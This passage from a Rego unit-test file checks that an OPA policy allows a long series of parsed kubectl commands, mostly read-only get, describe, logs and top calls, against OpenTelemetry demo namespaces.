    policy.allow with input as {"command": {"verb": "top", "resource": "pod", "namespace": "otel-demo", "args": ["ad-5ff96bb9bf-6mbjt"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl top pod ad-5ff96bb9bf-6mbjt -n otel-demo"}
}

test_allow_23 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["email-service-12345"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs email-service-12345 -n default"}
}

test_allow_24 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "configmap", "namespace": null, "args": ["demo.flagd"], "flags": [{"name": "-A", "value": null}]}, "original_command": "kubectl get configmap demo.flagd -A"}
}

test_allow_25 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "namespace", "namespace": null, "args": ["clickhouse"], "flags": []}, "original_command": "kubectl describe namespace clickhouse"}
}

test_allow_26 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": null, "args": ["ad"], "flags": [{"name": "-A", "value": null}]}, "original_command": "kubectl describe deployment ad -A"}
}

test_allow_27 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": "<namespace>", "args": ["frontend"], "flags": [{"name": "-n", "value": "<namespace>"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get svc frontend -n <namespace> -o yaml"}
}

test_allow_28 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "replicaset", "namespace": "otel-demo", "args": ["cart-5d9d8f8986"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get replicaset cart-5d9d8f8986 -n otel-demo"}
}

test_allow_29 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].name}{\"\\n\"}{end}"}]}, "original_command": "kubectl get deployments -n default -o=jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].name}{\"\\n\"}{end}\""}
}

test_allow_30 if {
    policy.allow with input as {"command": {"verb": "patch", "resource": "configmap", "namespace": "otel-demo", "args": ["flagd-config"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"remove\", \"path\": \"/data/product-catalog-failure\"}]"}]}, "original_command": "kubectl patch configmap flagd-config -n otel-demo --type=\"json\" -p=\"[{\"op\": \"remove\", \"path\": \"/data/product-catalog-failure\"}]\""}
}

test_allow_31 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": null, "args": ["frontend-proxy"], "flags": [{"name": "-o", "value": "jsonpath={.metadata.namespace}"}]}, "original_command": "kubectl get pod frontend-proxy -o jsonpath=\"{.metadata.namespace}\""}
}

test_allow_32 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "jsonpath={.items[?(@.metadata.labels.app==\"frontend\")].metadata.name}"}]}, "original_command": "kubectl get pods -n default -o jsonpath=\"{.items[?(@.metadata.labels.app==\"frontend\")].metadata.name}\""}
}

test_allow_33 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "*", "args": [], "flags": [{"name": "-n", "value": "*"}]}, "original_command": "kubectl get deployments -n *"}
}

test_allow_34 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": null, "args": ["frontend"], "flags": []}, "original_command": "kubectl describe deployment frontend"}
}

test_allow_35 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["cart-5d9d8f8986-v9jkm"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs cart-5d9d8f8986-v9jkm -n otel-demo"}
}

test_allow_36 if {
    policy.allow with input as {"command": {"verb": "top", "resource": "deployment", "namespace": "otel-demo", "args": ["recommendation"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl top deployment recommendation -n otel-demo"}
}

test_allow_37 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": null, "args": ["email"], "flags": [{"name": "-A", "value": null}]}, "original_command": "kubectl get svc email -A"}
}

test_allow_38 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["recommendation"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment recommendation -o yaml"}
}

test_allow_39 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "checkout-service", "args": ["checkout"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "checkout-service"}]}, "original_command": "kubectl get deployment checkout -o yaml -n checkout-service"}
}

test_allow_40 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["email-service-98765"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs email-service-98765 -n default"}
}

test_allow_41 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "production", "args": ["frontend-api"], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl describe deployment frontend-api -n production"}
}

test_allow_42 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["flagd-6cb7f79556"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs flagd-6cb7f79556 -n otel-demo"}
}

test_allow_43 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "<namespace>", "args": [], "flags": [{"name": "-n", "value": "<namespace>"}, {"name": "-l", "value": "app=frontend-proxy"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get pods -n <namespace> -l app=frontend-proxy -o yaml"}
}

test_allow_44 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["frontend-1"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs frontend-1 -n default"}
}

test_allow_45 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}]}, "original_command": "kubectl get services --all-namespaces"}
}

test_allow_46 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["frontend-api"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment frontend-api -n default -o yaml"}
}

test_allow_47 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["payment-759fdc546d-5ztjv"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs payment-759fdc546d-5ztjv -n otel-demo"}
}

test_allow_48 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].resources.requests.cpu}{\"\\t\"}{.spec.template.spec.containers[0].resources.requests.memory}{\"\\t\"}{.spec.template.spec.containers[0].resources.limits.cpu}{\"\\t\"}{.spec.template.spec.containers[0].resources.limits.memory}{\"\\n\"}{end}"}, {"name": "--selector", "value": "service in (ad,cart,payment)"}]}, "original_command": "kubectl get deployments -n otel-demo -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].resources.requests.cpu}{\"\\t\"}{.spec.template.spec.containers[0].resources.requests.memory}{\"\\t\"}{.spec.template.spec.containers[0].resources.limits.cpu}{\"\\t\"}{.spec.template.spec.containers[0].resources.limits.memory}{\"\\n\"}{end}\" --selector=service in (ad,cart,payment)"}
}

test_allow_49 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "endpoints", "namespace": "default", "args": ["frontend-proxy"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get endpoints frontend-proxy -n default"}
}

test_allow_50 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": "otel-demo", "args": ["frontend-77c7685488-9mfkx"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "jsonpath={.spec.nodeName}"}]}, "original_command": "kubectl get pod frontend-77c7685488-9mfkx -n otel-demo -o jsonpath=\"{.spec.nodeName}\""}
}

test_allow_51 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": "otel-demo", "args": ["checkout-6985f55d55-nhf2q"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get pod checkout-6985f55d55-nhf2q -n otel-demo -o yaml"}
}

test_allow_52 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployments", "namespace": "ingress-nginx", "args": [], "flags": [{"name": "-n", "value": "ingress-nginx"}]}, "original_command": "kubectl describe deployments -n ingress-nginx"}
}

test_allow_53 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "complex-us", "args": [], "flags": [{"name": "-n", "value": "complex-us"}]}, "original_command": "kubectl describe pods -n complex-us"}
}

test_allow_54 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "service in, (email,checkout)"}]}, "original_command": "kubectl get pods -n otel-demo -l service in (email,checkout)"}
}

test_allow_55 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": null, "args": ["recommendation"], "flags": []}, "original_command": "kubectl describe service recommendation"}
}

test_allow_56 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["checkout-6548d7f8cb-8455c"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs checkout-6548d7f8cb-8455c -n otel-demo"}
}

test_allow_57 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": "default", "args": ["ad"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl describe service ad -n default"}
}

test_allow_58 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["email-pod", "checkout-pod"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs email-pod checkout-pod -n otel-demo"}
}

test_allow_59 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=recommendation"}]}, "original_command": "kubectl get pods -n otel-demo -l app=recommendation"}
}

test_allow_60 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": ["frontend-proxy,frontend"], "flags": [{"name": "-o", "value": "wide"}, {"name": "-A", "value": null}]}, "original_command": "kubectl get services frontend-proxy,frontend -o wide -A"}
}

test_allow_61 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": null, "args": ["opentelemetry-operator"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployments opentelemetry-operator -o yaml"}
}

test_allow_62 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "service", "namespace": "default", "args": ["frontend-proxy"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "jsonpath={.metadata.labels}"}]}, "original_command": "kubectl get service frontend-proxy -n default -o jsonpath=\"{.metadata.labels}\""}
}

test_allow_63 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "ingresses", "namespace": null, "args": [], "flags": []}, "original_command": "kubectl describe ingresses"}
}

test_allow_64 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": null, "args": ["cart"], "flags": []}, "original_command": "kubectl describe pod cart"}
}

test_allow_65 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["currency"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment currency -o yaml"}
}

test_allow_66 if {
    policy.allow with input as {"command": {"verb": "top", "resource": "pod", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--selector", "value": "app=frontend"}]}, "original_command": "kubectl top pod -n otel-demo --selector=app=frontend"}
}

test_allow_67 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=recommendation"}]}, "original_command": "kubectl get events -n otel-demo -l app=recommendation"}
}

test_allow_68 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": null, "args": ["flagd"], "flags": [{"name": "-o", "value": "jsonpath={.status.loadBalancer.ingress[0].hostname}"}]}, "original_command": "kubectl get svc flagd -o=jsonpath=\"{.status.loadBalancer.ingress[0].hostname}\""}
}

test_allow_69 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "opensearch", "args": ["ad"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "opensearch"}]}, "original_command": "kubectl get deployment ad -o yaml -n opensearch"}
}

test_allow_70 if {
    policy.allow with input as {"command": {"verb": "patch", "resource": "configmap", "namespace": "otel-demo", "args": ["flagd-config"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"remove\", \"path\": \"/data/product-catalog-failure\"}]"}]}, "original_command": "kubectl patch configmap flagd-config -n otel-demo --type=\"json\" -p=\"[{\"op\": \"remove\", \"path\": \"/data/product-catalog-failure\"}]\""}
}

test_allow_71 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": null, "args": [], "flags": [{"name": "-l", "value": "app=frontend-api"}, {"name": "-o", "value": "custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace"}]}, "original_command": "kubectl get pods -l app=frontend-api -o custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace"}
}

test_allow_72 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "default", "args": [], "flags": [{"name": "--selector", "value": "app=frontend"}, {"name": "-n", "value": "default"}, {"name": "--sort-by", "value": ".metadata.creationTimestamp"}]}, "original_command": "kubectl describe pod --selector app=frontend -n default --sort-by=.metadata.creationTimestamp"}
}

test_allow_73 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "*", "args": [], "flags": [{"name": "-n", "value": "*"}]}, "original_command": "kubectl get pods -n *"}
}

test_allow_74 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--field-selector", "value": "involvedObject.name=flagd"}]}, "original_command": "kubectl get events -n otel-demo --field-selector involvedObject.name=flagd"}
}

test_allow_75 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pod", "namespace": "otel-demo", "args": ["checkout-6985f55d55-wl6s5"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "jsonpath={.spec.nodeName}"}]}, "original_command": "kubectl get pod checkout-6985f55d55-wl6s5 -n otel-demo -o jsonpath=\"{.spec.nodeName}\""}
}

test_allow_76 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["load-generator"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment load-generator -o yaml"}
}

test_allow_77 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": "otel-demo", "args": ["ad"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe service ad -n otel-demo"}
}

test_allow_78 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "opensearch", "args": ["recommendation"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "opensearch"}]}, "original_command": "kubectl get deployment recommendation -o yaml -n opensearch"}
}

test_allow_79 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "production", "args": [], "flags": [{"name": "-l", "value": "service=frontend"}, {"name": "-n", "value": "production"}]}, "original_command": "kubectl describe pods -l service=frontend -n production"}
}

test_allow_80 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": null, "args": ["frontend-proxy"], "flags": []}, "original_command": "kubectl describe pod frontend-proxy"}
}

test_allow_81 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "otel-demo", "args": ["frontend"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe deployment frontend -n otel-demo"}
}

test_allow_82 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--field-selector", "value": "involvedObject.labelSelector=app.kubernetes.io/name=email"}]}, "original_command": "kubectl get events -n otel-demo --field-selector involvedObject.labelSelector=app.kubernetes.io/name=email"}
}

test_allow_83 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "default", "args": ["frontend-proxy"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl describe pod frontend-proxy -n default"}
}

test_allow_84 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "service", "namespace": "default", "args": ["frontend-proxy"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl describe service frontend-proxy -n default"}
}

test_allow_85 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": [], "flags": []}, "original_command": "kubectl get services"}
}

test_allow_86 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["productcatalogservice"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl get deployment productcatalogservice -o yaml -n default"}
}

test_allow_87 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["checkout-service"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs checkout-service -n default"}
}

test_allow_88 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "otel-demo", "args": ["email"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe deployment email -n otel-demo"}
}

test_allow_89 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "chaos-mesh", "args": [], "flags": [{"name": "-n", "value": "chaos-mesh"}]}, "original_command": "kubectl get pods -n chaos-mesh"}
}

test_allow_90 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "<namespace>", "args": ["email-service"], "flags": [{"name": "-n", "value": "<namespace>"}]}, "original_command": "kubectl get deployment -n <namespace> email-service"}
}

test_allow_91 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["quote"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get deployment quote -n default"}
}

test_allow_92 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--field-selector", "value": "involvedObject.name=ad"}]}, "original_command": "kubectl get events -n otel-demo --field-selector involvedObject.name=ad"}
}

test_allow_93 if {
    policy.allow with input as {"command": {"verb": "create", "resource": "pod", "namespace": "otel-demo", "args": ["checkout-6985f55d55-fpkzm"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--image", "value": "<your-image>"}, {"name": "--image-pull-policy", "value": "Always"}]}, "original_command": "kubectl create pod -n otel-demo checkout-6985f55d55-fpkzm --image=<your-image> --image-pull-policy=Always"}
}

test_allow_94 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "opensearch", "args": ["flagd"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "opensearch"}]}, "original_command": "kubectl get deployment flagd -o yaml -n opensearch"}
}

test_allow_95 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-l", "value": "app=frontend-proxy"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pods -l app=frontend-proxy -n otel-demo"}
}

test_allow_96 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=checkout"}]}, "original_command": "kubectl get pods -n otel-demo -l app=checkout"}
}

test_allow_97 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "service=frontend"}]}, "original_command": "kubectl describe deployment -n default -l service=frontend"}
}

test_allow_98 if {
    policy.allow with input as {"command": {"verb": "top", "resource": "pod", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--containers", "value": "recommendation"}]}, "original_command": "kubectl top pod -n otel-demo --containers=recommendation"}
}

test_allow_99 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "cronjobs", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get cronjobs -n default"}
}

test_allow_100 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": null, "args": [], "flags": []}, "original_command": "kubectl get deployments"}
}

test_allow_101 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": null, "args": ["frontend-service"], "flags": [{"name": "-A", "value": null}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}"}]}, "original_command": "kubectl get svc frontend-service -A -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}\""}
}

test_allow_102 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--field-selector", "value": "involvedObject.name=checkout-6985f55d55-rpnj7"}]}, "original_command": "kubectl get events -n otel-demo --field-selector involvedObject.name=checkout-6985f55d55-rpnj7"}
}

test_allow_103 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["cart"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment cart -o yaml"}
}

test_allow_104 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "otel-demo", "args": ["server"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get deployment server -n otel-demo"}
}

test_allow_105 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "complex-us", "args": ["frontend"], "flags": [{"name": "-n", "value": "complex-us"}]}, "original_command": "kubectl describe deployment frontend -n complex-us"}
}

test_allow_106 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}, {"name": "-o", "value": "wide"}]}, "original_command": "kubectl get services --all-namespaces -o wide"}
}

test_allow_107 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "node", "namespace": null, "args": ["i-01c3cf2df279dcbd6"], "flags": []}, "original_command": "kubectl describe node i-01c3cf2df279dcbd6"}
}

test_allow_108 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["email"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get deployment email -n default"}
}

test_allow_109 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": null, "args": [], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get pods -o yaml"}
}

test_allow_110 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["cart"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod cart -n otel-demo"}
}

test_allow_111 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": ["frontend-77c7685488-fl8hv,frontend-proxy-676d989b95-nmtp5"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get pods frontend-77c7685488-fl8hv,frontend-proxy-676d989b95-nmtp5 -n otel-demo"}
}

test_allow_112 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "production", "args": ["cart"], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl describe deployment cart -n production"}
}

test_allow_113 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "endpoints", "namespace": "tracing", "args": [], "flags": [{"name": "-n", "value": "tracing"}]}, "original_command": "kubectl get endpoints -n tracing"}
}

test_allow_114 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": [], "flags": [{"name": "-A", "value": null}]}, "original_command": "kubectl get services -A"}
}

test_allow_115 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "events", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--field-selector", "value": "involvedObject.name=shipping-b6d77f95-wht4c"}]}, "original_command": "kubectl get events -n otel-demo --field-selector=involvedObject.name=shipping-b6d77f95-wht4c"}
}

test_allow_116 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": [], "flags": [{"name": "-l", "value": "app=service"}, {"name": "-n", "value": "default"}, {"name": "--all-containers", "value": "true"}]}, "original_command": "kubectl logs -l app=service -n default --all-containers=true"}
}

test_allow_117 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl get deployments -n default"}
}

test_allow_118 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "otel-demo", "args": ["recommendation"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get deployment recommendation -o yaml -n otel-demo"}
}

test_allow_119 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--selector", "value": "app=Recommendation"}]}, "original_command": "kubectl get pods -n otel-demo --selector=app=Recommendation"}
}

test_allow_120 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["email-service-6844d48d8c-2288b"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs email-service-6844d48d8c-2288b -n default"}
}

test_allow_121 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["checkout-6985f55d55-s44mw"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod checkout-6985f55d55-s44mw -n otel-demo"}
}

test_allow_122 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=frontend"}]}, "original_command": "kubectl get pods -n otel-demo -l app=frontend"}
}

test_allow_123 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "svc", "namespace": "default", "args": ["shipping-quote"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get svc shipping-quote -n default -o yaml"}
}

test_allow_124 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": "test-namespace", "args": [], "flags": [{"name": "-n", "value": "test-namespace"}]}, "original_command": "kubectl get services -n test-namespace"}
}

test_allow_125 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["cart"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs cart -n otel-demo"}
}

test_allow_126 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app.kubernetes.io/name=checkout"}]}, "original_command": "kubectl get pods -n otel-demo -l app.kubernetes.io/name=checkout"}
}

test_allow_127 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["frontend-proxy"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod frontend-proxy -n otel-demo"}
}

test_allow_128 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "app=quote"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get services -n default -l app=quote -o yaml"}
}

test_allow_129 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "deployment", "namespace": "<namespace>", "args": ["email-service"], "flags": [{"name": "-n", "value": "<namespace>"}]}, "original_command": "kubectl describe deployment email-service -n <namespace>"}
}

test_allow_130 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "default", "args": ["email-service"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment email-service -n default -o yaml"}
}

test_allow_131 if {
    policy.allow with input as {"command": {"verb": "edit", "resource": "deployment", "namespace": "otel-demo", "args": ["checkout"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--patch", "value": "{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"checkout\",\"image\":\"quay.io/it-bench/supported-checkout-service-arm64:0.0.3\"}]}}}}"}]}, "original_command": "kubectl edit deployment checkout -n otel-demo --patch \"{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"checkout\",\"image\":\"quay.io/it-bench/supported-checkout-service-arm64:0.0.3\"}]}}}}\""}
}

test_allow_132 if {
